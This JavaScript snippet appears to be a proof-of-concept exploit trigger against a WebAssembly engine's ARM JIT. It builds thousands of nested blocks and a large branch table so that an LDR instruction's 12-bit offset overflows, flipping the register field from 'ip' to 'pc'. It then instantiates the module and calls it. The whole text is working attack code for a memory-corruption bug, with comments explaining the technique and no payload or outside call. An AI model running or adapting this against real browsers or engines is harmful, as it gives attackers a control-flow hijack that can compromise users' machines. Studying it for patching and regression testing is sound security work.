
log("Starting WASM Builder");
let builder = new WasmModuleBuilder();
let body = [];
// We're going to overflow the 12-bit immediate of an LDR instruction to set bits
// in the register part of the instruction. We want to set the bottom two bits
// which will flip `ip` to `pc`
const bits_to_set = 0x3000;
// Each switch case we add to our branch table adds four-bytes to the LDR offset.
const NUM_CASES = (bits_to_set/4) + 1;
// Enter the nested code blocks
for (let i=0; i<NUM_CASES; i++) {
 body.push(kExprBlock);
 body.push(kWasmStmt);
}
// Add a BrTable which selects a code block based on arg0
 body.push(kExprBlock);
 body.push(kWasmStmt);
 body.push(kExprGetLocal, 0);
 body.push(kExprBrTable, ...varuint32(NUM_CASES));
 for (let i=0; i<NUM_CASES; i++) {
 body.push(...wasmI32Const(i));
 }
 body.push(0); // default case
 body.push(kExprEnd);
// Add returns from 4096 nested blocks
for (let i=0; i<NUM_CASES; i++) {
 body.push(...wasmI32Const(i));
 body.push(kExprReturn);
 body.push(kExprEnd);
}
// Default return value
body.push(...wasmI32Const(-1));
builder.addFunction('main', kSig_i_i)
 .addBody(body)
 .exportFunc();
log("Constructed WASM layout");
let buffer = builder.toBuffer(true);
log("Built WASM buffer");
let mod = new WebAssembly.Module(buffer);
log("Built WASM Module");
let inst = new WebAssembly.Instance(mod, {});
log("Instantiated WASM Module");
inst.exports.main(0)
